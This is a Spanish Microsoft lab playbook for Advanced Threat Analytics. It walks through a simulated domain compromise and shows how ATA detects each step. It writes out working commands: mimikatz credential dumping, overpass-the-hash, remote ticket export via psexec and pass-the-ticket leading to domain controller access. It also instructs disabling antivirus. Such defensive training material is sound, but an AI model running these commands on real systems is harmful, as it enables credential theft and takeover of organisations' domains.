---
title: "Guía de simulación de ataques de Advanced Threat Analytics"
description: "Esta guía sirve para que los clientes conozcan los ataques de robo de credenciales que se pueden producir en un sistema operativo Windows, sepan cómo usar herramientas de investigación disponibles de forma pública para llevar a cabo esas acciones y sepan cómo Microsoft ATA es capaz de detectar estas amenazas."
author: yuridio
ms.author: yurid
manager: mbaldwin
ms.date: 06/06/2017
ms.topic: solution
ms.prod: 
ms.service: advanced-threat-analytics
ms.technology: techgroup-identity
ms.assetid: da5eda7c-29bb-429f-9366-72495667c010
ms.reviewer: v-craic
ms.suite: ems
ms.translationtype: Human Translation
ms.sourcegitcommit: b14dcbddb611dc49da2f92cf3f1aca1593af11c0
ms.openlocfilehash: 923f827a8c122af393b1909ba55bb73c650d62fc
ms.contentlocale: es-es
ms.lasthandoff: 07/07/2017


---

<a id="advanced-threat-analytics-attack-simulation-playbook" class="xliff"></a>
# Guía de simulación de ataques de Advanced Threat Analytics

Esta guía sirve para conocer diversos tipos de robo de credenciales (como pass-the-hash, pass-the-ticket y over-pass-the-hash) y aprender a usar herramientas de investigación disponibles de forma pública para llevar a cabo esas acciones. Esta guía de simulación se centra en un escenario de compilación basado en herramientas de Internet válidas que los atacantes usan. El objetivo consiste en enseñar al usuario a pensar como un atacante (de manera gráfica), a desenvolverse dentro de un entorno con credenciales robadas y a usar Microsoft Advanced Threat Analytics (ATA) para detectar este tipo de actividades en el entorno.

En esta guía desgranaremos los siguientes escenarios de ataque:

- Reconocimiento de DNS
- Enumeración de servicios de directorio
- Enumeración de sesiones SMB
- Recopilación de credenciales (lsass.exe)
- Overpass-the-Hash
- Pass-the-ticket
- Ejecución remota de código
- Skeleton Key
- Sincronización de controladores de dominio

> [!IMPORTANT]
> Los pasos que se explican en esta guía deben realizarse únicamente en un entorno de laboratorio, y no en uno de producción.

<a id="configuring-your-lab-environment" class="xliff"></a>
## Configurar un entorno de laboratorio

Recomendamos seguir fielmente estas instrucciones, incluidos los experimentos del final.  Tendrá que configurar algunos elementos, más concretamente, cuatro equipos, tres usuarios y algún software de investigación obtenido de Internet.

Visite [Evaluaciones de Advanced Threat Analytics](http://aka.ms/ataeval) para obtener instrucciones sobre cómo instalar ATA y hacerse con una copia de evaluación de 90 días. 

> [!IMPORTANT]
> Esta guía versa sobre la versión 1.7 de ATA.


<a id="scenario" class="xliff"></a>
### Escenario

En este ejemplo de laboratorio, JeffV es el administrador de su propia estación de trabajo.  En muchos departamentos de TI, todavía se requiere a sus usuarios que trabajen con privilegios de administrador.  En estos escenarios, los ataques de escalación de privilegios locales no son necesarios, puesto que el adversario ya tiene acceso de administrador en el entorno desde el que se van a realizar las operaciones posteriores a la infiltración. 
 
Sin embargo, incluso cuando los departamentos de TI reducen los privilegios al uso de cuentas no administrativas, existen otras formas de ataque (como vulnerabilidades de aplicaciones conocidas, ataques de día 0, etc.) que se ejecutan para lograr la escalación de privilegios locales. Para tales casos, en esta guía se da por hecho que el adversario ha logrado la escalación de privilegios locales en el equipo de la víctima.  En este laboratorio ficticio, esto se consigue a través de un correo electrónico de suplantación de identidad dirigido al destinatario JeffV, como se detalla más adelante en esta guía.


<a id="servers-and-workstations" class="xliff"></a>
### Servidores y estaciones de trabajo

Aquí se enumeran los equipos necesarios y las configuraciones empleadas en este ejercicio.  Todos estos equipos están almacenados provisionalmente como máquinas virtuales (VM) invitadas en Windows 10 Hyper-V.  Si decide realizar esto (cosa que le recomendamos), asegúrese de que las máquinas virtuales se encuentran en el mismo conmutador virtual.

| NOMBRE DE DOMINIO COMPLETO | Sistema operativo | IP | Finalidad |
| --- | --- | --- | --- |
| DC1.contoso.local | Windows Server 2012 R2 | 192.168.10.10 | Controlador de dominio con la puerta de enlace de ligera (LWGW) de ATA instalada |
| ATACenter.contoso.local | Windows Server 2012 R2 | 192.168.10.20 | Centro ATA |
| Admin-PC.contoso.local | Windows 7 Enterprise | 192.168.10.30 | PC del administrador |
| Victim-PC.contoso.local | Windows 7 Enterprise | 192.168.10.31 | PC de la víctima |

El dominio en este laboratorio es “CONTOSO.LOCAL”. Cree el dominio y, luego, una a él estos equipos. Cuando los cuatro equipos estén activos y unidos al dominio, vaya a la siguiente sección para agregar algunos usuarios ficticios al entorno.


<a id="users-configuration" class="xliff"></a>
### Configuración de usuarios

Ahora crearemos distintos roles para las tareas de departamento de soporte técnico y administradores de dominio.  Lo que pretendemos al crear estos roles es separar las obligaciones de cada uno, pero, como veremos más adelante en esta guía, esto no es suficiente para impedir el robo de credenciales, los movimientos laterales o la escalación de dominios, dado que es difícil comprender las dependencias de seguridad que trascienden a estos dos grupos en un entorno. 

Primero, crearemos los siguientes usuarios en el dominio: 

| Nombre | Miembros | Finalidad |
| --- | --- | --- |
| Departamento de soporte técnico. | RonHD | Se encarga de administrar los clientes de contoso.local. |

Ahora crearemos el siguiente grupo de seguridad con un miembro específico:

| Nombre completo | CuentaSAM | Finalidad |
| --- | --- | --- |
| Jeff Víctima | JeffV | Por increíble que parezca, víctima de otro ataque de suplantación de identidad de objetivos específicos realmente efectivo. |
| Ron HD | RonHD | Ron es el chico a quien todo el mundo acude en el departamento de TI de Contoso.  RonHD es miembro del grupo de seguridad "Helpdesk". |
| Nuck Chorris | NuckC | Hasta ahora no se tenía conocimiento de su existencia.  En Contoso, resulta ser el *administrador de dominio*. |

> [!IMPORTANT]
> Antes de continuar, asegúrese de haber agregado a *RonHD* como miembro del grupo de seguridad *Helpdesk*.


Nuck Chorris, el administrador de dominio de Contoso, usa la estación de trabajo *Admin-PC*. El grupo de seguridad *Helpdesk* (del que *RonHD* es miembro) también administra el equipo de *NuckC*.  Esto se puede configurar usando [grupos restringidos](https://support.microsoft.com/kb/279301). Las propiedades del grupo de administradores deben parecerse a la siguiente pantalla:

![Propiedades de administradores](./media/ata-attack-simulation-playbook/ata-attack-simulation-playbook-fig1.png)

Además, como sucede en muchos departamentos de TI, *JeffV* se agregó como administrador de su propio dispositivo (*Victim-PC*).  Esto se ha hecho adrede y se explicará más adelante en este artículo. Las propiedades del grupo de administradores locales deben parecerse a la siguiente pantalla:

![Propiedades de administradores 2](./media/ata-attack-simulation-playbook/ata-attack-simulation-playbook-fig2.png)


<a id="security-research-tools" class="xliff"></a>
### Herramientas de investigación de seguridad

Para configurar este laboratorio, será necesario descargar las siguientes herramientas e instalarlas en la carpeta *C:\tools* del equipo *Victim-PC*:

- [Mimikatz](https://github.com/gentilkiwi/mimikatz)
- [PowerSploit](https://github.com/PowerShellMafia/PowerSploit)
- [PsExec](https://technet.microsoft.com/en-us/sysinternals/bb897553.aspx) 
- [NetSess.exe](http://www.joeware.net/freetools)

La carpeta "tools" debe parecerse a la siguiente pantalla:

![Propiedades de administradores](./media/ata-attack-simulation-playbook/ata-attack-simulation-playbook-fig3.png)


> [!IMPORTANT]
> El uso de estas herramientas está pensado únicamente para fines de investigación.  Microsoft no es propietario de estas herramientas ni puede garantizar su comportamiento.  Estas herramientas se deben ejecutar única y exclusivamente en un entorno de laboratorio de pruebas.

A efectos de este laboratorio, desactive todos los antivirus en el equipo *Victim-PC*. Aunque pueda parecer que, al desactivar el antivirus, los resultados van a ser sesgados, conviene aclarar que el código fuente de estas herramientas está disponible de forma gratuita, lo que significa que los atacantes pueden modificarlo para soslayar la detección basada en firmas de los antivirus. También es importante tener en cuenta que, en cuanto un adversario logra el acceso de administrador local en un equipo, es más que probable que pueda soslayar el antivirus.  Llegado este punto, el objetivo consiste en proteger el resto de la organización. El hecho de que un equipo esté en peligro no debería dar lugar a la escalación a otros dominios, y mucho menos a ponerlos en riesgo.

<a id="environment-topology" class="xliff"></a>
### Topología del entorno

En este momento, el laboratorio debe ser similar al siguiente:

![Topología](./media/ata-attack-simulation-playbook/ata-attack-simulation-playbook-fig4.png)

Tal y como se ha apuntado anteriormente en esta guía, existen distintos roles para *Domain Admins* y *Helpdesk*pero durante esta demostración veremos que basta con una vinculación de dependencia de seguridad (en este caso, el usuario *RonHD*) para que un adversario se haga con el control de todo el entorno, y ello usando herramientas de investigación ya disponibles.

<a id="helpdesk-simulation" class="xliff"></a>
### Simulación de departamento de soporte técnico

Para simular un escenario común de departamento de soporte técnico (en el que los integrantes del departamento de soporte técnico inician sesión en equipos diferentes), inicie sesión con *RonHD* en *Victim-PC* y, después, vuelva a iniciarla como *JeffV*.  Utilice la opción "Cambiar de usuario" para simular la administración de credenciales con privilegios en esta estación de trabajo.

![Cambiar de usuario](./media/ata-attack-simulation-playbook/ata-attack-simulation-playbook-fig5.png)


Existen otras formas de simular este flujo de trabajo de administración en este laboratorio, como crear cuentas de servicio de script por lotes, tareas programadas y sesión de RDP o "ejecutar como" en la línea de comandos.  En las operaciones seguras, algo (no necesariamente alguien) tiene que administrar estos recursos, y administración significa privilegios de administrador local. A efectos de este laboratorio y por aprovechar el tiempo lo mejor posible, se ha optado por incluir la ruta más rápida para simular este flujo de trabajo.

> [!IMPORTANT]
> No cierre la sesión ni reinicie *Victim-PC* en este momento, ya que ello eliminará las credenciales de *RonHD* de la memoria y tendrá que volver a crear el escenario de *helpdesk*. 

En la siguiente tabla se resumen las credenciales guardadas en cada equipo:

| Equipo | Credenciales guardadas en el equipo |
| --- | --- |
| Admin-PC | - NuckC |
| Victim-PC | - JeffV y RonHD (como consecuencia de crear el escenario de helpdesk) |

Llegado este punto, el entorno de laboratorio está listo. El estado actual del laboratorio está en una posición en la que una sola vulnerabilidad puede poner en riesgo el dominio.  Como veremos ahora, ese riesgo único suele consistir en el enfrentamiento de los activos con menos privilegios del entorno con aplicaciones de Internet procedentes de un adversario muy motivado que no se detendrá.  Aquí es donde deberemos [asumir que se ha producido una infracción de seguridad](https://blogs.msdn.microsoft.com/azuresecurity/2015/10/19/an-insiders-look-at-the-security-of-microsoft-azure-assume-the-breach/).

<a id="executing-the-attack" class="xliff"></a>
## Ejecutar el ataque

En esta sección de la guía, usará herramientas reales y simulará las actividades posteriores a la infiltración de un adversario.

<a id="beachhead-via-spearphish" class="xliff"></a>
### Punto de partida: suplantación de identidad dirigida a destinatarios

En este ataque simulado, se da por hecho que el adversario ha conseguido privilegios de administrador local en un equipo del entorno.  Aunque esto puede lograrse con distintos métodos, con bastante frecuencia sucede a través de campañas de suplantación de identidad dirigida a destinatarios en una organización. 

En [Microsoft Security Intelligence Report volumen 21](https://www.microsoft.com/security/sir/default.aspx) se abordan dos grupos actuantes diferentes, PROMETHIUM y NEODYNIUM. Ambos grupos de actividad participan en una suplantación de identidad dirigida a destinatarios para introducirse en sus entornos de destino.  ¿Por qué?  Desde el punto de vista de un atacante, el correo electrónico es una forma rápida de burlar las defensas de red de una organización. La siguiente imagen es un ejemplo de un correo real de suplantación de identidad dirigida a destinatarios que el Centro de inteligencia de amenazas de Microsoft ha seguido y respondido.

![Correo de suplantación de identidad dirigida a destinatarios](./media/ata-attack-simulation-playbook/ata-attack-simulation-playbook-fig6.png)


En un entorno seguro, la pérdida de un único host no debería significar la puesta en riesgo de todo un dominio o bosque.  Ocurrida la infracción de seguridad, resulta imperativo detectar el siguiente movimiento del adversario.

<a id="reconnaissance" class="xliff"></a>
### Reconocimiento

Cuando un adversario humano logra tener presencia en un entorno, comienza el proceso de reconocimiento.  En esta fase, el adversario dedica tiempo a investigar el entorno (detectar la configuración, los equipos de interés, hacer una lista de los grupos de seguridad y otros objetos de Active Directory de interés, etc.) para componerse una idea del entorno.

<a id="dns-reconnaissance" class="xliff"></a>
#### Reconocimiento de DNS

Una de las primeras cosas que harán muchos adversarios es tratar de recibir todo el contenido de DNS. Microsoft ATA es capaz de detectar esta acción.

En Victim-PC, comenzaremos el proceso de reconocimiento de DNS; para ello, iniciaremos sesión con las credenciales de JeffV, que es el PC y el usuario que el adversario acaba de poner en riesgo, y ejecutaremos los siguientes comandos: 
    
    nslookup
    ls -d contoso.local

El resultado debería ser similar a la siguiente pantalla:

![Nslookup](./media/ata-attack-simulation-playbook/ata-attack-simulation-playbook-fig7.png)

En este laboratorio, el DNS está configurado para bloquear esta operación de volcado de DNS en el dominio. Por desgracia, este evento se pasa por alto o se pierde en el ruido de la red con demasiada frecuencia, lo que impide a los defensores de la red darse cuenta de que un adversario ha logrado cierto nivel de acceso en el entorno y de que se encuentra en la fase inicial de un ataque con un destinatario más concreto.

Microsoft ATA hace que sea más fácil detectar este tipo de ataque, dado que marca cualquier actividad de DNS sospechosa, como se muestra aquí:

![Nslookup](./media/ata-attack-simulation-playbook/ata-attack-simulation-playbook-fig8.png)

Como ATA analiza constantemente el tráfico DNS, puede ver la solicitud de volcado, se haya cursado correctamente o no.  Ofrece incluso la posibilidad de aprender de este evento para ocasiones futuras, en caso de que la actividad sospechosa fuera lícita y procediera de un dispositivo de análisis de DNS aprobado.

En este caso, se ha impedido al adversario lo que hubiera sido un gran logro para él: hacer un volcado DNS, volver a otras técnicas de reconocimiento.

> [!IMPORTANT]
> Detectar errores propios puede ser igual de revelador que detectar ataques reales contra un entorno.
 
En la alerta de ATA de arriba, probablemente se haya percatado de una burbuja azul en la actividad sospechosa. Esto significa que ATA está en constante aprendizaje, basado tanto en los datos usados como en los de los analistas.  Los comentarios de los analistas sirven para descartar verdaderos positivos y reducir el ruido con el tiempo, así como para personalizar ATA y sus detecciones de actividades sospechosas en el entorno.

<a id="directory-services-enumeration" class="xliff"></a>
#### Enumeración de servicios de directorio

El [protocolo remoto del Administrador de cuentas de seguridad (SAMR)](https://msdn.microsoft.com/library/cc245477.aspx) proporciona funciones de administración de usuarios y grupos en todo el dominio.  Conocer la relación entre los usuarios, los grupos y los privilegios puede ser verdaderamente importante para un adversario.  Cualquier usuario autenticado puede ejecutar estos comandos. Vea [este artículo](https://gallery.technet.microsoft.com/SAMRi10-Hardening-Remote-48d94b5b#content) para obtener más información sobre la configuración de SAMR y cómo restringir este reconocimiento únicamente a los usuarios que sean miembros del grupo de administradores locales.

<a id="enumerate-all-users-and-groups" class="xliff"></a>
#### Enumerar todos los usuarios y grupos

Tener una lista de todos los usuarios y grupos es muy útil para un adversario,  como lo es conocer los nombres de usuario y los nombres de grupos.  Un atacante quiere obtener toda la información posible durante la fase de reconocimiento.

Para simular la enumeración de usuarios y grupos, debe usar la cuenta puesta en riesgo de *JeffV* para iniciar sesión en *Victim-PC*. Tras iniciar sesión, usaremos los siguientes comandos para intentar obtener todos los grupos y usuarios de dominio:

    net user /domain
    net group /domain

En la siguiente imagen se muestra un ejemplo del resultado del primer comando:

![net user](./media/ata-attack-simulation-playbook/ata-attack-simulation-playbook-fig9.png)

En la siguiente imagen se muestra un ejemplo del resultado del segundo comando:

![net group](./media/ata-attack-simulation-playbook/ata-attack-simulation-playbook-fig10.png)

La razón de que estas operaciones sucedan correctamente se debe a que se han realizado con credenciales legítimas. Ahora el problema consiste en que el atacante conoce todos los usuarios y grupos del entorno. Sin una herramienta como Microsoft ATA, esta acción probablemente hubiera pasado desapercibida.

En este tipo de operaciones, Microsoft ATA marca la alerta que refleja el ataque y muestra también los datos que el atacante haya podido obtener.

![Reconocimiento](./media/ata-attack-simulation-playbook/ata-attack-simulation-playbook-fig11.png)

<a id="enumerate-high-privileged-accounts" class="xliff"></a>
#### Enumerar cuentas con privilegios elevados

En este momento, el atacante tiene una lista con los usuarios y otra con los grupos.  Pero saber quién pertenece a cada grupo también es importante, sobre todo en el caso de los grupos con privilegios elevados, como *Administradores de empresas* y *Admins. del dominio*. Para obtener esta información en el entorno de laboratorio, inicie sesión como *JeffV* en *Victim-PC* y ejecute el siguiente comando:

    net group “domain admins” /domain

En la siguiente imagen se muestra un ejemplo del resultado de este comando:

![net group 2](./media/ata-attack-simulation-playbook/ata-attack-simulation-playbook-fig12.png)

Ahora el atacante tiene todos los usuarios y todos los grupos y sabe qué usuarios pertenecen al grupo con privilegios elevados *Admins. del dominio*. En un escenario real, la probabilidad de que el ataque siga avanzando y trate de obtener los administradores de empresa es muy alta, ya que no hay ningún límite de seguridad entre *Administradores de empresas* y *Admins. del dominio*.

> [!IMPORTANT]
> Para obtener más información sobre los límites de seguridad entre bosques y dominios, entre los grupos Administradores de empresas y Admins. del dominio y otros privilegios de "nivel 0", vea [Protección del material de referencia de acceso con privilegios](http://www.aka.ms/tier0).

Para obtener la lista de miembros del grupo *Administradores de empresas* en este laboratorio, ejecute el siguiente comando en *Victim-PC*:

    net group “enterprise admins” /domain

En la siguiente imagen se muestra un ejemplo del resultado de este comando:

![net group 3](./media/ata-attack-simulation-playbook/ata-attack-simulation-playbook-fig13.png)

En el ejemplo anterior, solo hay una cuenta en el grupo *Administradores de empresas*. En este caso, la información no es de mucha utilidad, ya que es simplemente la configuración predeterminada; lo importante es que el atacante tiene un conocimiento mucho más profundo de las cuentas y ha identificado el usuario al que tiene más intención de poner en peligro.

<a id="smb-session-enumeration" class="xliff"></a>
### Enumeración de sesiones SMB

En este punto, el adversario sabe a quién quiere dirigir su ataque de credenciales, pero con la información actual no sabe exactamente cómo hacerlo. Con la enumeración de SMB, puede conocer la ubicación exacta donde están estas cuentas de gran interés.

Todos los usuarios autenticados tienen que conectarse al controlador de dominio para procesar la directiva de grupo (en SYSVOL), con lo cual la enumeración de SMB constituye una herramienta valiosa para los atacantes. Esto convierte los controladores de dominio (DC) en los principales objetivos para realizar enumeraciones de SMB.

En esta parte del laboratorio, usaremos *NetSess*, la primera herramienta de investigación descargada de Internet.  *NetSess* es una herramienta de línea de comandos con la que se enumeran las sesiones NetBIOS en un equipo local o remoto concreto.  

Para obtener una lista de quién está conectado a un equipo específico (en este caso, el controlador de dominio), en *Victim-PC* vaya a la ubicación donde NetSess esté guardado localmente y ejecute el siguiente comando:

    NetSess.exe dc1.contoso.local

En la siguiente imagen se muestra un ejemplo del resultado de este comando:

![NetSess](./media/ata-attack-simulation-playbook/ata-attack-simulation-playbook-fig14.png)

Este tipo de reconocimiento es difícil de detectar con los controles de seguridad tradicionales, como un firewall. Lo que aumenta la probabilidad de que este ataque tenga éxito es el hecho de que los departamentos de TI hacen un uso muy profuso del protocolo SMB, que es un protocolo del que Active Directory depende en muchas operaciones. Microsoft ATA es capaz de detectar actividades de enumeración de sesiones SMB y desencadena una alerta para informar de las cuentas que han quedado expuestas.

Microsoft ATA permite obtener los mismos datos relevantes que el atacante, e identifica la cuenta de origen, el equipo de origen, las cuentas expuestas y las direcciones IP en el momento en que se produjo la enumeración del adversario. En la siguiente pantalla se puede ver un ejemplo de esto:

![SMB](./media/ata-attack-simulation-playbook/ata-attack-simulation-playbook-fig15.png)

Los datos que Microsoft ATA ofrece son fundamentales para aumentar la concienciación sobre seguridad, lo que a su vez le ayuda a estar más preparado para responder a los ataques.

<a id="lateral-movement" class="xliff"></a>
### Movimiento lateral

El objetivo de esta fase es tener acceso a la dirección IP detectada (192.168.10.30), donde están las credenciales del equipo de *NuckC*. Para realizar esta acción, enumeraremos las credenciales en memoria que hay en *Victim-PC*. Recuerde que en *Victim-PC* no solo están expuestas las credenciales de *JeffV*, sino que hay otras muchas cuentas que un atacante podría encontrar muy útiles de detectar. 


Para extraer las credenciales de *Victim-PC* usaremos mimikatz, otra herramienta de investigación descargada de Internet. Desde un símbolo del sistema con privilegios elevados en *Victim-PC*, vaya a la carpeta "tools" (donde *Mimikatz* está guardado) y ejecute el siguiente comando:

    mimikatz.exe “privilege::debug” “sekurlsa::logonpasswords” “exit” >> c:\temp\victim-pc.txt

En la siguiente imagen se muestra un ejemplo del resultado de este comando:

![mimikatz](./media/ata-attack-simulation-playbook/ata-attack-simulation-playbook-fig16.png)

Con el comando anterior se ejecutará mimikatz, que seguidamente recopilará todas las credenciales en memoria.  La herramienta registrará esto en un archivo de texto llamado "victim-pc.txt". Abra el archivo "victim-pc.txt" para ver qué puede averiguar.

El siguiente paso es analizar el resultado del volcado de credenciales de *mimikatz*. Para ello, es necesario abrir el archivo "victim-pc.txt" en el Bloc de notas.  No se alarme si el archivo no es exactamente igual al del siguiente ejemplo, ya que tendrá un aspecto distinto si se usan contraseñas o sistemas operativos diferentes con configuraciones predeterminadas activadas o desactivadas.

![Salida](./media/ata-attack-simulation-playbook/ata-attack-simulation-playbook-fig17.png)

Según este resultado de ejemplo, el atacante encontró las credenciales de JeffV, lo que le permitirá suplantar la identidad de JeffV. El atacante también encontró la cuenta de equipo que, al igual que una cuenta de usuario, se puede agregar al grupo de *administradores locales* de otros equipos y otros grupos de seguridad con privilegios elevados.  Esto no es útil en este escenario, pero conviene recordar siempre que las *cuentas de equipo* también pueden asignar privilegios en cualquier otro sitio.

En el siguiente ejemplo, verá que el atacante también detectó una cuenta interesante en principio, *RonHD*. Recuerde que *RonHD* inició sesión en *Victim-PC* durante la fase de configuración. Esa credencial quedó expuesta en el [proceso LSA](https://msdn.microsoft.com/library/windows/desktop/aa378327%28v=vs.85%29.aspx) en memoria en ese momento, y mimikatz acaba de hacerlo visible para el atacante. El usuario *RonHD* no apareció al enumerar los usuarios de los grupos *Admins. del dominio* o *Administradores de empresas*, pero ahora el atacante sí tiene acceso a sus credenciales.

![Nslookup](./media/ata-attack-simulation-playbook/ata-attack-simulation-playbook-fig18.png)

Merece la pena señalar también que, en algunos casos, el volcado de memoria de mimikatz podría revelar contraseñas de texto sin formato si el entorno no está actualizado o configurado para evitar [WDigest](https://blogs.technet.microsoft.com/kfalde/2014/11/01/kb2871997-and-wdigest-part-1/). Un entorno actualizado en el que se respeten los procedimientos recomendados devolverá un campo de *contraseña* vacío.   

El siguiente paso lógico de un atacante es comprobar si la cuenta de *RonHD* es valiosa y, para ello, el atacante hará algún tipo de actividad de reconocimiento en esa cuenta. Para simular esto en el laboratorio, ejecutaremos el siguiente comando en *Victim-PC*:

    net user ronhd /domain

En la siguiente imagen se muestra un ejemplo del resultado de este comando:

![net user domain](./media/ata-attack-simulation-playbook/ata-attack-simulation-playbook-fig19.png)

Según este resultado, el atacante sabrá si *RonHD* es miembro de *Helpdesk*. La cuenta de *RonHD* acaba de pasar a ser interesante para el atacante.  Con todo, es necesario realizar más análisis para ver si la cuenta tiene privilegios de administrador en otros equipos. Al fin y al cabo, no tendría mucho sentido usarla para desplazarse lateralmente a otro equipo para descubrir que tiene menos privilegios de los que el atacante ya posee.

En función de esto, el siguiente paso es enumerar a qué grupos pertenece un equipo remoto. En este paso, usaremos *PowerSploit*, una serie de módulos de PowerShell que usan los encargados de las pruebas de penetración. Abra una sesión de PowerShell y desplácese a la ubicación donde *PowerSploit* esté guardado localmente en *Victim-PC*.  Ejecute el siguiente comando en la consola de PowerShell:

    Import-Module .\PowerSploit.psm1
    Get-NetLocalGroup 192.168.10.30

El primer comando sirve para importar el módulo de *PowerSploit* a la memoria y, el segundo, para ejecutar una de las funciones suministradas por ese módulo (en este caso, *Get-NetLocalGroup*).

En la siguiente imagen se muestra un ejemplo del resultado de este comando:

![PowerShell](./media/ata-attack-simulation-playbook/ata-attack-simulation-playbook-fig20.png)

La dirección IP 192.168.10.30 es la dirección IP detectada en la fase de enumeración de SMB, como ya se ha explicado anteriormente en esta guía. El atacante averiguó solo lo siguiente: 

- La dirección IP 192.168.10.30 está conectada a *Admin-PC* (la resolución de nombres también se realizó con PowerSploit).
- "Contoso.local/Domain Admins" y "Contoso.local/Helpdesk" son miembros del *grupo Administradores*.

*RonHD* es miembro del grupo *Helpdesk*, así que *RonHD* puede dar al atacante privilegios de *administrador* en *Admin-PC* (donde el atacante sabe que está *NuckC*, gracias a la actividad de reconocimiento anterior).  
El atacante ha pensado aquí de manera [gráfica](https://blogs.technet.microsoft.com/johnla/2015/04/26/defenders-think-in-lists-attackers-think-in-graphs-as-long-as-this-is-true-attackers-win/) para detectar las relaciones existentes en la red. Esta forma de pensar es algo que los defensores de la red deben adoptar para mantener a raya las nuevas amenazas dirigidas a las redes empresariales. 

Ahora es el momento de usar a *RonHD* para realizar un movimiento lateral por medio de un ataque [overpass-the-hash](). Si el atacante se encuentra en un entorno en el que no se deshabilitó WDigest, ya está todo perdido, puesto que tendrá la contraseña de texto sin formato.  Pero en este laboratorio vamos a suponer que desconocemos la contraseña de texto sin formato ni tenemos acceso a ella.

Con una técnica denominada overpass-the-hash, se puede obtener el hash NTLM y usarlo para conseguir un vale de concesión de vales (TGT) a través de Kerberos\Active Directory.  Con un TGT, se puede hacer pasar por Ron**HD y acceder a los recursos del dominio a los que *RonHD* tenga acceso.  

Copie el hash NTLM de *RonHD* del archivo victim-pc.txt recopilado anteriormente (al realizar el volcado de credenciales desde Victim-PC). Luego, vaya a *Victim-PC*, acceda a la ubicación donde *mimikatz* esté almacenado en el sistema de archivos y ejecute los siguientes comandos:

    Mimikatz.exe “privilege::debug” “sekurlsa::pth /user:RonHD /ntlm:[ntlm hash] /domain:contoso.local” “exit”

Reemplace *[ntlm hash]* por el valor de NTLM que copió de victim-pc.txt.

En la siguiente imagen se muestra un ejemplo del resultado de este comando:

![mimikatz 2](./media/ata-attack-simulation-playbook/ata-attack-simulation-playbook-fig21.png)

Se abre una nueva sesión de símbolo del sistema, en la que se han insertado las credenciales de *RonHD*. Para validar si se puede leer el contenido de la unidad C de *Admin-PC* (algo que *JeffV* no debe ser capaz de hacer), ejecute el siguiente comando desde la nueva sesión de línea de comandos:

    dir \\admin-pc\c$
   
En la siguiente imagen se muestra un ejemplo del resultado de este comando:

![dir](./media/ata-attack-simulation-playbook/ata-attack-simulation-playbook-fig22.png)

El resultado de este comando demuestra que en este momento tiene acceso a la unidad C de *Admin-PC*. Ahora, validaremos que el nuevo símbolo del sistema que hemos abierto insertó el vale de *RonHD* y no que simplemente configuramos erróneamente a *JeffV* para tener derechos de lectura.

Después, inspeccionaremos los vales en el símbolo del sistema de overpass-the-hash. Ejecute el siguiente comando en el nuevo símbolo del sistema que se abrió a raíz del ataque overpass-the-hash:

    klist

En la siguiente imagen se muestra un ejemplo del resultado de este comando:

![klist](./media/ata-attack-simulation-playbook/ata-attack-simulation-playbook-fig23.png)

Como se puede ver, en este momento estamos suplantando la identidad de *RonHD* en este símbolo del sistema, que confirma que usamos sus credenciales legítimas para tener acceso a su propio *Admin-PC*.

Habrá observado que Microsoft ATA generó una alerta de implementación de protocolo no habitual, como se refleja aquí. Esto sucede porque overpass-the-hash usa NTLM y, por lo tanto, RC4. Desde la posición del defensor de la red, aprenderá que en *Victim-PC* la cuenta de RonHD se autenticó correctamente en el controlador de dominio.  A partir de aquí, podría comenzar nuestra investigación.

![Protocolo no habitual](./media/ata-attack-simulation-playbook/ata-attack-simulation-playbook-fig24.png) 

<a id="domain-escalation" class="xliff"></a>
### Escalación de dominio

Ahora el atacante tiene acceso a *Admin-PC*, un equipo que se identificó (a través de una actividad de reconocimiento anterior) como un buen vector de ataque para poner en peligro la cuenta con privilegios elevados *NuckC*. Ahora, el atacante quiere desplazarse a *Admin-PC*, escalando los privilegios en el dominio.

Para ello, el atacante recopilará las credenciales por medio de un ataque [pass-the-hash](https://www.microsoft.com/security/sir/strategy/default.aspx#!pass_the_hash_defenses), que nos permitirá ir a *Admin-PC*.   

Desde un nuevo símbolo del sistema, ejecutado en el contexto de *RonHD*, vaya a la parte del sistema de archivos donde esté mimikatz en esa biblioteca y ejecute el siguiente comando:

    xcopy mimikatz \\admin-pc\c$\temp

Después, ejecute mimiKatz de forma remota y use el siguiente comando para exportar todos los vales Kerberos desde *Admin-PC*:

    psexec.exe \\admin-pc -accepteula cmd /c (cd c:\temp ^& mimikatz.exe “privilege::debug” “sekurlsa::tickets /export” ^& “exit”)

Vuelva a copiar estos vales en *Victim-PC* utilizando el siguiente comando:

    xcopy \\admin-pc\c$\temp c:\temp\tickets

En la siguiente imagen se muestra un ejemplo del resultado de este comando:

![XCopy](./media/ata-attack-simulation-playbook/ata-attack-simulation-playbook-fig25.png) 

Esta operación ha puesto de manifiesto que el atacante copió correctamente la herramienta *mimikatz* en *Admin-PC*. El atacante ejecutó mimikatz correctamente de forma remota y exportó todos los vales Kerberos desde *Admin-PC*.  Por último, el atacante volvió a copiar los resultados en *Victim-PC* y ahora tiene las credenciales de *NuckC* sin necesidad de atacar su equipo.

El siguiente paso es localizar el TGT de *NuckC*. Para ello, hay que encontrar los archivos .kirbi que no sean de *NuckC* (es decir, "ADMIN-PC$"), eliminarlos y conservar los vales de *NuckC*.

En la siguiente imagen se muestra un ejemplo del resultado de este comando:

![Explorador](./media/ata-attack-simulation-playbook/ata-attack-simulation-playbook-fig26.png) 

En este momento, el atacante puede pasar los vales a la memoria y usarlos para obtener acceso a los recursos como si fuera *NuckC*. El atacante está listo para importarlos a la memoria de *Victim-PC* y hacerse con las credenciales para tener acceso a recursos confidenciales. Esta operación se realiza a través del ataque [pass-the-ticket](https://blogs.technet.microsoft.com/windowsserver/tag/pass-the-ticket/).

Ejecute el siguiente comando desde un símbolo del sistema con privilegios elevados donde *mimikatz* se encuentre:

    mimikatz.exe “privilege::debug” “kerberos::ptt c:\temp\tickets” “exit”

En la siguiente imagen se muestra un ejemplo del resultado de este comando:

![privilegio de mimikatz](./media/ata-attack-simulation-playbook/ata-attack-simulation-playbook-fig27.png) 

Asegúrese de que los vales de *NuckC@krbtgt-CONTOSO.LOCAL* se han importado correctamente, como se muestra en el ejemplo anterior.

Debe validar que la sesión de símbolo del sistema contiene los vales adecuados. Para ello, ejecute lo siguiente en el mismo símbolo del sistema con privilegios elevados:

    klist

En la siguiente imagen se muestra un ejemplo del resultado de este comando:

![klist 2](./media/ata-attack-simulation-playbook/ata-attack-simulation-playbook-fig28.png) 

El atacante ha importado correctamente el vale obtenido en la sesión y ahora aprovechará este nuevo privilegio para acceder a la unidad C del controlador de dominio. Ejecute el siguiente comando en el mismo símbolo del sistema al que se acaban de importar los vales:

    dir \\dc1\c$

En la siguiente imagen se muestra un ejemplo del resultado de este comando:

![dir 2](./media/ata-attack-simulation-playbook/ata-attack-simulation-playbook-fig29.png) 

